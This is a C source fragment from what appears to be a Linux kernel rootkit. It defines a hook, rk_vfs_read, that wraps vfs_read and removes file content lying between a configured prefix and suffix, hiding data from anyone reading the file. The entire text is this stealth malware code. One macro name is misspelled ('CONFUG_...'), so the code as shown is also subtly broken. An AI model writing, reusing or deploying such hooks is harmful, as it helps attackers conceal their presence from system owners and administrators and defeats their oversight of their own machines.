#ifdef CONFIG_FILE_TAMPERING

ssize_t (*orig_vfs_read)(struct file *file, char __user *buf, size_t count, loff_t *pos);

#include "../file.h"

ssize_t rk_vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos) {
	
	ssize_t ret = orig_vfs_read(file, buf, count, pos);

	if (file_tampering_flag) {
		if (file_check_prefix_suffix(buf, ret, CONFIG_RK_FILE_CONTENT_PREFIX_TO_HIDE, CONFIG_RK_FILE_CONTENT_SUFFIX_TO_HIDE) == 1)
			ret = hide_file_content(buf, ret, CONFUG_RK_FILE_CONTENT_PREFIX_TO_HIDE, CONFIG_RK_FILE_CONTENT_SUFFIX_TO_HIDE );
	}
	return ret;
}

#endif